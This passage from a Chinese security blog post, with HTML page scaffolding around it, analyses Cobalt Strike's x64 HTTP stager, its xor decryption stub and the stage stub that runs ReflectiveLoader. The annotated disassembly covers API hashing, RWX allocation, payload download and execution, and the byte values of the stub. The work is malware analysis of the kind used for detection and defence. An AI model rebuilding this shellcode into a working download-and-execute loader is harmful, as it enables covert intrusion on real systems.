+<p>四、校验 PE + 找导出表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040  52                    push rdx                   ; 保存模块相关指针</span><br><span class="line">0041  41:51                 push r9                    ; 保存模块名哈希</span><br><span class="line">0043  48:8B52 20            mov rdx, [rdx+0x20]        ; rdx &#x3D; 模块基址</span><br><span class="line">0047  8B42 3C               mov eax, [rdx+0x3C]        ; e_lfanew</span><br><span class="line">004A  48:01D0               add rax, rdx               ; rax &#x3D; PE 头</span><br><span class="line">004D  66:8178 18 0B02      cmp word [rax+0x18], 0x20B  ; 是 x64 吗</span><br><span class="line">0053  75 72                 jne 0x00C7                 ; 不是就换下一个模块</span><br><span class="line">0055  8B80 88000000         mov eax, [rax+0x88]        ; 导出表 RVA</span><br><span class="line">005B  48:85C0               test rax, rax              ; 有导出表吗</span><br><span class="line">005E  74 67                 je 0x00C7                  ; 没有就换模块</span><br><span class="line">0060  48:01D0               add rax, rdx               ; rax &#x3D; 导出表 VA</span><br></pre></td></tr></table></figure>
+
+<p>五、遍历导出名，比对API的哈希</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0063  50                    push rax                   ; 保存导出表 VA</span><br><span class="line">0064  8B48 18               mov ecx, [rax+0x18]        ; NumberOfNames</span><br><span class="line">0067  44:8B40 20            mov r8d, [rax+0x20]        ; AddressOfNames RVA</span><br><span class="line">006B  49:01D0               add r8, rdx                ; r8 &#x3D; 名字表 VA</span><br><span class="line">006E  E3 56                 jrcxz 0x00C6               ; 名字数为0则失败</span><br><span class="line">0070  48:FFC9               dec rcx                    ; 从最后一个名字开始</span><br><span class="line">0073  41:8B3488             mov esi, [r8+rcx*4]        ; 第 rcx 个名字 RVA</span><br><span class="line">0077  48:01D6               add rsi, rdx               ; rsi &#x3D; 名字 VA</span><br><span class="line">007A  4D:31C9               xor r9, r9                 ; 哈希 &#x3D; 0</span><br><span class="line">007D  48:31C0               xor rax, rax</span><br><span class="line">0080  AC                    lodsb                      ; 逐字符</span><br><span class="line">0081  41:C1C9 0D            ror r9d, 0x0D              ; ror13</span><br><span class="line">0085  41:01C1               add r9d, eax</span><br><span class="line">0088  38E0                  cmp al, ah                 ; 遇到字符串结尾 0 吗</span><br><span class="line">008A  75 F1                 jne 0x007D                 ; 没到结尾继续</span><br><span class="line">008C  4C:034C24 08          add r9, [rsp+8]            ; 哈希加上模块名哈希（复合哈希）</span><br><span class="line">0091  45:39D1               cmp r9d, r10d              ; 和目标哈希 r10d 比对</span><br><span class="line">0094  75 D8                 jne 0x006E                 ; 不匹配，试下一个名字</span><br></pre></td></tr></table></figure>
+
+<p>六、找到函数，算出地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0096  58                    pop rax                    ; rax &#x3D; 导出表 VA</span><br><span class="line">0097  44:8B40 24            mov r8d, [rax+0x24]        ; AddressOfNameOrdinals RVA</span><br><span class="line">009B  49:01D0               add r8, rdx</span><br><span class="line">009E  6641:8B0C48           mov cx, [r8+rcx*2]         ; 取序号</span><br><span class="line">00A3  44:8B40 1C            mov r8d, [rax+0x1C]        ; AddressOfFunctions RVA</span><br><span class="line">00A7  49:01D0               add r8, rdx</span><br><span class="line">00AA  41:8B0488             mov eax, [r8+rcx*4]        ; 函数 RVA</span><br><span class="line">00AE  48:01D0               add rax, rdx               ; rax &#x3D; 函数 VA</span><br></pre></td></tr></table></figure>
+
+<p>七、恢复现场</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00B1  41:58                 pop r8</span><br><span class="line">00B3  41:58                 pop r8</span><br><span class="line">00B5  5E                    pop rsi</span><br><span class="line">00B6  59                    pop rcx</span><br><span class="line">00B7  5A                    pop rdx</span><br><span class="line">00B8  41:58                 pop r8</span><br><span class="line">00BA  41:59                 pop r9</span><br><span class="line">00BC  41:5A                 pop r10</span><br></pre></td></tr></table></figure>
+
+<p>八、调用目标函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00BE  48:83EC 20            sub rsp, 0x20              ; 影子空间（shadow space）</span><br><span class="line">00C2  41:52                 push r10                   ; r10 压栈</span><br><span class="line">00C4  FFE0                  jmp rax                    ; 跳到刚解析出的函数</span><br></pre></td></tr></table></figure>
+
+<p>影子空间（Shadow Space）是 Windows x64 调用约定强制要求调用方在栈上预留的一块 32 字节（4 × 8 字节） 区域，专门给被调用的函数使用。在执行 jmp rax 尾调用目标 API之前，手动在栈上挖出影子空间。因为 shellcode 是手写的汇编，编译器不会自动帮它做这件事，所以必须自己 sub rsp, 0x20 来满足 x64 ABI 的要求</p>
+<p>九、如果当前模块没找到目标函数，遍历模块链表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00C6  58                    pop rax</span><br><span class="line">00C7  41:59                 pop r9</span><br><span class="line">00C9  5A                    pop rdx</span><br><span class="line">00CA  48:8B12               mov rdx, [rdx]             ; 链表下一项</span><br><span class="line">00CD  E9 4FFFFFFF           jmp 0x0021                 ; 回到遍历模块</span><br></pre></td></tr></table></figure>
+
+<h2 id="加载多个http函数"><a href="#加载多个http函数" class="headerlink" title="加载多个http函数"></a>加载多个http函数</h2><p>上面的 wininet.dll 已经被 LoadLibraryA 加载，所以直接通过修改r10d即可加载指定函数，InternetOpenA、InternetConnectA、HttpOpenRequestA</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00EF  48:31C9               xor rcx, rcx</span><br><span class="line">00F2  48:31D2               xor rdx, rdx</span><br><span class="line">00F5  4D:31C0               xor r8, r8</span><br><span class="line">00F8  4D:31C9               xor r9, r9</span><br><span class="line">00FB  41:50                 push r8</span><br><span class="line">00FD  41:50                 push r8</span><br><span class="line">00FF  41:BA 3A5679A7        mov r10d, 0xA779563A       ; InternetOpenA 哈希</span><br><span class="line">0105  FFD5                  call rbp                   ; 调解析器 → InternetOpenA</span><br><span class="line">0107  EB 73                 jmp 0x017C                 ; 跳过下面的数据&#x2F;代码</span><br></pre></td></tr></table></figure>
+
+<h2 id="分配内存执行"><a href="#分配内存执行" class="headerlink" title="分配内存执行"></a>分配内存执行</h2><p>如果HttpSendRequestA发送http请求成功，开始调用 VirtualAlloc 开启空间用来下载，分配 4MB RWX</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">030E  48:31C9               xor rcx, rcx</span><br><span class="line">0311  BA 00004000           mov edx, 0x400000          ; 4MB</span><br><span class="line">0316  41:B8 00100000        mov r8d, 0x1000            ; MEM_COMMIT</span><br><span class="line">031C  41:B9 40000000        mov r9d, 0x40              ; PAGE_EXECUTE_READWRITE (RWX)</span><br><span class="line">0322  41:BA 58A453E5        mov r10d, 0xE553A458       ; VirtualAlloc 哈希</span><br><span class="line">0328  FFD5                  call rbp                   ; → VirtualAlloc</span><br><span class="line">032A  48:93                 xchg rbx, rax              ; rbx &#x3D; 缓冲区 获取返回值</span><br><span class="line">032C  53                    push rbx</span><br><span class="line">032D  53                    push rbx</span><br><span class="line">032E  48:89E7               mov rdi, rsp               ; rdi &#x3D; 读字节数存放处</span><br><span class="line">0331  48:89F1               mov rcx, rsi               ; hRequest</span><br><span class="line">0334  48:89DA               mov rdx, rbx               ; 缓冲区</span><br><span class="line">0337  41:B8 00200000        mov r8d, 0x2000            ; 每次读 8192 字节</span><br><span class="line">033D  49:89F9               mov r9, rdi</span><br><span class="line">0340  41:BA 129689E2        mov r10d, 0xE2899612       ; InternetReadFile 哈希</span><br><span class="line">0346  FFD5                  call rbp                   ; → InternetReadFile</span><br><span class="line">0348  48:83C4 20            add rsp, 0x20</span><br><span class="line">034C  85C0                  test eax, eax</span><br><span class="line">034E  74 B6                 je 0x0306                  ; 失败 → 重试&#x2F;放弃</span><br><span class="line">0350  66:8B07               mov ax, [rdi]              ; 本次读到的字节数</span><br><span class="line">0353  48:01C3               add rbx, rax               ; 缓冲区指针前进</span><br><span class="line">0356  85C0                  test eax, eax</span><br><span class="line">0358  75 D7                 jne 0x0331                 ; 还有数据就继续读</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">035A  58                    pop rax                    ; 弹出缓冲区地址相关值</span><br><span class="line">035B  58                    pop rax</span><br><span class="line">035C  58                    pop rax</span><br><span class="line">035D  48:05 00000000        add rax, 0                 ; 可调整偏移</span><br><span class="line">0363  50                    push rax</span><br><span class="line">0364  C3                    ret                        ; ret 到 Beacon 入口，执行载荷</span><br></pre></td></tr></table></figure>
+
+<p>当stager发起HTTP请求下载stage时，server返回一段 shellcode + 加密stage，为了防止stage在网络中明文传输，做了简单的xor加密并通过shellcode进行解密，shellcode模板为 xor64.bin</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fc                    cld                         ; 清方向标志 DF&#x3D;0，保证后续串操作&#x2F;循环方向正确</span><br><span class="line">48 83 e4 f0           and rsp, 0FFFFFFFFFFFFFFF0h ; 栈 16 字节对齐（x64 ABI 要求）</span><br><span class="line">eb 33                 jmp 000000000000003B        ; 跳过 0x33 字节的内嵌数据，落到解密逻辑入口</span><br><span class="line">5d                    pop rbp                     ; 取出栈上保存的数据指针（基址）</span><br><span class="line">8b 45 00              mov eax, [rbp+0]            ; 读第 1 个 DWORD 作为异或密钥初值</span><br><span class="line">48 83 c5 04           add rbp, 4                  ; 指针后移 4</span><br><span class="line">8b 4d 00              mov ecx, [rbp+0]            ; 读下一个 DWORD</span><br><span class="line">31 c1                 xor ecx, eax                ; 用前一个值异或</span><br><span class="line">48 83 c5 04           add rbp, 4</span><br><span class="line">55                    push rbp                    ; 保存当前指针</span><br><span class="line">8b 55 00              mov edx, [rbp+0]            ; 读再下一个 DWORD</span><br><span class="line">31 c2                 xor edx, eax</span><br><span class="line">89 55 00              mov [rbp+0], edx            ; 写回解密结果</span><br><span class="line">31 d0                 xor eax, edx                ; 更新密钥链</span><br><span class="line">48 83 c5 04           add rbp, 4</span><br><span class="line">83 e9 04              sub ecx, 4                  ; 计数器减 4（ecx 被当长度用）</span><br><span class="line">31 d2                 xor edx, edx</span><br><span class="line">39 d1                 cmp ecx, edx</span><br><span class="line">74 02                 je  +2                      ; 若 ecx&#x3D;&#x3D;0，跳出循环</span><br><span class="line">eb e7                 jmp -0x19                   ; 否则回跳继续解密（到 5d 处）</span><br><span class="line">58                    pop rax                     ; 弹出之前保存的指针&#x2F;目标地址</span><br><span class="line">fc                    cld</span><br><span class="line">48 83 e4 f0           and rsp, -16</span><br><span class="line">ff d0                 call rax                    ; 调用解密后的目标（跳到解密出的代码执行）</span><br><span class="line">e8 c8 ff ff ff        call 000000000000000E       ; 递归&#x2F;回跳到解密循环入口（偏移 0x0E）</span><br></pre></td></tr></table></figure>
+
+<p>最终内存为：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261115164108752.png" alt="image-20261115164108752"></p>
+<h1 id="Stage-stub-shellcode-分析"><a href="#Stage-stub-shellcode-分析" class="headerlink" title="Stage stub shellcode 分析"></a>Stage stub shellcode 分析</h1><p>完整的stub shellcode用于定位内嵌在 BeaconDLL中的ReflectiveLoader函数并调用它，然后调用 DllMain</p>
+<table>
+<thead>
+<tr>
+<th>字节</th>
+<th>汇编</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>4D 5A 41 52</code></td>
+<td><code>db &#39;MZAR&#39;</code></td>
+<td>数据非指令。伪装 DOS 头，并作为 <code>lea</code> 的锚点，指向 stub 起始（即 DLL 基址）</td>
+</tr>
+<tr>
+<td><code>55</code></td>
+<td><code>push rbp</code></td>
+<td>保存调用者栈帧指针</td>
+</tr>
+<tr>
+<td><code>48 89 E5</code></td>
+<td><code>mov rbp, rsp</code></td>
+<td>建立当前栈帧</td>
+</tr>
+<tr>
+<td><code>48 81 EC 20 00 00 00</code></td>
+<td><code>sub rsp, 0x20</code></td>
+<td>分配 32 字节影子空间，满足 x64 调用约定</td>
+</tr>
+<tr>
+<td><code>48 8D 1D EA FF FF FF</code></td>
+<td><code>lea rbx, [rip - 0x16]</code></td>
+<td>回退 22 字节到 <code>MZAR</code> 处，<code>rbx = Beacon DLL 基址</code></td>
+</tr>
+<tr>
+<td><code>48 89 DF</code></td>
+<td><code>mov rdi, rbx</code></td>
+<td><code>rdi = DLL 基址</code>，暂存为 <code>ReflectiveLoader</code> 的参数</td>
+</tr>
+<tr>
+<td><code>48 81 C3 44 64 01 00</code></td>
+<td><code>add rbx, 0x16444</code></td>
+<td><code>0x16444</code> 是 <code>ReflectiveLoader</code> 的 RVA，<code>rbx = 其绝对地址</code></td>
+</tr>
+<tr>
+<td><code>FF D3</code></td>
+<td><code>call rbx</code></td>
+<td>调用 <code>ReflectiveLoader</code>，返回 <code>DllMain</code> 地址到 <code>rax</code></td>
+</tr>
+<tr>
+<td><code>41 B8 F0 B5 A2 56</code></td>
+<td><code>mov r8d, 0x56A2B5F0</code></td>
+<td><code>DllMain</code> 第 3 参数设为 CS 魔数 <code>0x56A2B5F0</code></td>
+</tr>
+<tr>
+<td><code>68 04 00 00 00</code></td>
+<td><code>push 4</code></td>
+<td>压入 <code>DLL_PROCESS_ATTACH</code></td>
+</tr>
+<tr>
+<td><code>5A</code></td>
+<td><code>pop rdx</code></td>
+<td><code>rdx = 4</code>，作为 <code>DllMain</code> 第 2 参数</td>
+</tr>
+<tr>
+<td><code>48 89 F9</code></td>
+<td><code>mov rcx, rdi</code></td>
+<td><code>rcx = DLL 基址</code>，作为 <code>DllMain</code> 第 1 参数</td>
+</tr>
+<tr>
+<td><code>FF D0</code></td>
+<td><code>call rax</code></td>
+<td>调用 <code>DllMain(基址, DLL_PROCESS_ATTACH, 魔数)</code>，启动 Beacon</td>
+</tr>
+</tbody></table>
+<h1 id="Stage-ReflectiveLoader-分析"><a href="#Stage-ReflectiveLoader-分析" class="headerlink" title="Stage ReflectiveLoader 分析"></a>Stage ReflectiveLoader 分析</h1><p>挑选一个BeaconLoader.VA.x64.o解密后逆向分析可以看到详细的ReflectiveLoader干了什么，简单总结为</p>
+<ul>
+<li><p>解析自身所需 API（优先 Kernel32 EAT，失败则动态解析）</p>
+</li>
+<li><p>读取 PE 头，根据 0x8000 位决定是否使用 RWX 内存</p>
+</li>
+<li><p>VirtualAlloc 分配内存，复制头和节区</p>
+</li>
+<li><p>修复导入表、解密混淆节区、处理重定位、设置内存权限</p>
+</li>
+<li><p>调用 DllMain(DLL_PROCESS_ATTACH, 魔数) 启动 Beacon</p>
+</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108025022796.png" alt="image-20261108025022796"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10232">https://xz.aliyun.com/news/10232</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2017">https://forum.butian.net/share/2017</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-264470-1.htm">https://bbs.kanxue.com/thread-264470-1.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/706012441">https://zhuanlan.zhihu.com/p/706012441</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/31/Threat-Intelligence-TTP-Notes-2/" rel="prev" title="威胁情报TTP笔记-2">
+                  <i class="fa fa-angle-left"></i> 威胁情报TTP笔记-2
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
